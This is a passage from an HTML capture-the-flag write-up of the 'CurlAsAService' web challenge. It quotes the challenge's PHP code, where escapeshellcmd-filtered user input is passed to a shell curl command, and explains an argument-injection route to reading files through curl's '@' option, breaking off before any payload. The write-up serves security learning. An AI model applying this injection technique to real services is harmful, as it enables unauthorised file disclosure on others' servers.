@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Web challenge.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;challenges&#x2F;curlasaservice#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            CurlAsAService<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-03-23</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.svg"
+                src="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/cover.svg"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#files">Files</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#socket-127-0-0-1-1337">Socket 127.0.0.1:1337</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#exploration">Exploration</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#fingerprinting">Fingerprinting</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#exploration-1">Exploration</a>
+                                </li>
+
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#files-1">Files</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#socket-127-0-0-1-1337-1">Socket 127.0.0.1:1337</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#os-command-injection">OS command injection</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#lfi">LFI</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#socket-94-237-49-166-45094">Socket 94.237.49.166:45094</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>Category</strong>: Web</p>
+<p><strong>Release date</strong>: 2023-09-29</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/107">makelaris</a> &amp;
+<a href="https://app.hackthebox.com/users/31190">TRX</a></p>
+<p><strong>Description</strong>: cURL As A Service or CAAS is a brand new Alien application,
+built so that humans can test the status of their websites. However, it seems
+that the Aliens have not quite got the hang of Human programming and the
+application is riddled with issues.</p>
+<h1 id="setup">Setup</h1>
+<p>I'll complete this challenge using a Kali Linux VM.</p>
+<h1 id="files">Files</h1>
+<p>For this challenge, we're given the source code of the target website.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace
+</span><span class="z-text z-plain">└── web_caas
+</span><span class="z-text z-plain">    ├── Dockerfile
+</span><span class="z-text z-plain">    ├── build_docker.sh
+</span><span class="z-text z-plain">    ├── challenge
+</span><span class="z-text z-plain">    │   ├── Router.php
+</span><span class="z-text z-plain">    │   ├── controllers
+</span><span class="z-text z-plain">    │   │   └── CurlController.php
+</span><span class="z-text z-plain">    │   ├── index.php
+</span><span class="z-text z-plain">    │   ├── models
+</span><span class="z-text z-plain">    │   │   └── CommandModel.php
+</span><span class="z-text z-plain">    │   ├── static
+</span><span class="z-text z-plain">    │   │   ├── css
+</span><span class="z-text z-plain">    │   │   │   └── main.css
+</span><span class="z-text z-plain">    │   │   └── js
+</span><span class="z-text z-plain">    │   │       └── main.js
+</span><span class="z-text z-plain">    │   └── views
+</span><span class="z-text z-plain">    │       └── index.php
+</span><span class="z-text z-plain">    ├── config
+</span><span class="z-text z-plain">    │   ├── fpm.conf
+</span><span class="z-text z-plain">    │   ├── nginx.conf
+</span><span class="z-text z-plain">    │   └── supervisord.conf
+</span><span class="z-text z-plain">    └── flag
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Apparently, it's an Nginx server.</p>
+<p>I'll execute the <code>build_docker.sh</code> script on my machine to replicate the setup
+on the target machine.</p>
+<h1 id="socket-127-0-0-1-1337">Socket <code>127.0.0.1:1337</code></h1>
+<h2 id="exploration">Exploration</h2>
+<p>Let's browse to <code>http://127.0.0.1:1337/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/web-homepage.png" alt="Web homepage" /></p>
+<p>It's a website to verify the status of a host.</p>
+<h2 id="fingerprinting">Fingerprinting</h2>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/web-homepage-wappalyzer.png" alt="Web homepage Wappalyzer extension" /></p>
+<h2 id="exploration-1">Exploration</h2>
+<p>If we query the localhost, we receive the HTML corresponding to the web page.</p>
+<p>If we specify an invalid URL, we receive the <code>Illegal Characters Detected</code>
+message.</p>
+<h1 id="files-1">Files</h1>
+<p>This website follows a MVC design pattern.</p>
+<p>As usual with this pattern, the <code>CurlController.php</code> file is of particular
+interest:</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-storage z-type z-class z-php">class</span> <span class="z-entity z-name z-class z-php">CurlController</span>
+</span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-php">{</span></span></span><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">    <span class="z-storage z-modifier z-php">public</span> <span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">index</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-variable z-parameter z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>router</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php">
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php">    <span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-keyword z-control z-php">return</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>router</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">view</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">index</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">    </span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">    <span class="z-storage z-modifier z-php">public</span> <span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">execute</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-variable z-parameter z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>router</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php">
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php">    <span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>url</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">ip</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-keyword z-control z-php">if</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">isset</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>url</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>command</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-other z-new z-php">new</span> <span class="z-meta z-path z-php"><span class="z-support z-class z-php">CommandModel</span></span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>url</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-keyword z-control z-php">return</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-json z-php">json_encode</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php"><span class="z-punctuation z-section z-array z-begin z-php">[</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">message</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-key z-php">=&gt;</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>command</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">exec</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-array z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">    </span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"></span></span><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-php">}</span></span></span>
+</span></span></span></span></code></pre>
+<p>This controller is mapped to the <code>/api/curl</code> endpoint. It retrieves the <code>ip</code>
+value from the POST parameter and generates a new <code>CommandModel</code> object using
+this <code>ip</code> value. Then, it returns the output of the <code>exec</code> function as a JSON
+<code>message</code> field.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-storage z-type z-class z-php">class</span> <span class="z-entity z-name z-class z-php">CommandModel</span>
+</span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-php">{</span></span></span><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">    <span class="z-storage z-modifier z-php">public</span> <span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php"><span class="z-support z-function z-magic z-php">__construct</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-variable z-parameter z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>url</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php">
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php">    <span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-variable z-language z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>this</span><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-other z-member z-php">command</span> <span class="z-keyword z-operator z-assignment z-php">=</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">curl --proto =http,https -sSL </span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">escapeshellcmd</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>url</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"> </span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">2&gt;&amp;1</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">    </span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">    <span class="z-storage z-modifier z-php">public</span> <span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">exec</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php">
+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php">    <span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>output</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">shell_exec</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-language z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>this</span><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-other z-member z-php">command</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">        <span class="z-keyword z-control z-php">return</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>output</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">    </span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"></span></span><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-php">}</span></span></span>
+</span></span></span></span></code></pre>
+<p>The <code>CommandModel.php</code> file holds the logic for checking the host connectivity.
+In fact, it has a <code>command</code> attribute corresponding to an OS command that uses
+<code>curl</code> with the parameters <code>--proto=http,https</code>(to enable HTTP and HTTPS
+requests), <code>-sSL</code> (to silently perform the request, to follow redirects and to
+show if it failed to perform the request) followed by the escaped <code>url</code>.</p>
+<p>The <code>exec</code> function is used to actually execute this command on the OS, and to
+return the output.</p>
+<h1 id="socket-127-0-0-1-1337-1">Socket <code>127.0.0.1:1337</code></h1>
+<h2 id="os-command-injection">OS command injection</h2>
+<p>The interesting thing with the source code of this website is that the <code>url</code>
+variable used with <code>curl</code> is user-controllable, and is set to the value of the
+<code>ip</code> POST parameter sent to <code>/api/curl</code>. This means that we can control which
+command is executed on the system.</p>
+<p>Unfortunately, we don't have an OS command injection, since the website uses
+<code>escapeshellcmd</code> to escape all shell characters.</p>
+<h2 id="lfi">LFI</h2>
+<p>What we can do however is an argument injection: <code>escapeshellcmd</code> doesn't escape
+spaces, so we can pass arguments to the <code>curl</code> command to change its intended
+behavior.</p>
+<p>One thing to note is that <code>curl</code> can be used to send data, and that the <code>@</code>
+symbol indicates to <code>curl</code> that what follows is a file path from which the data
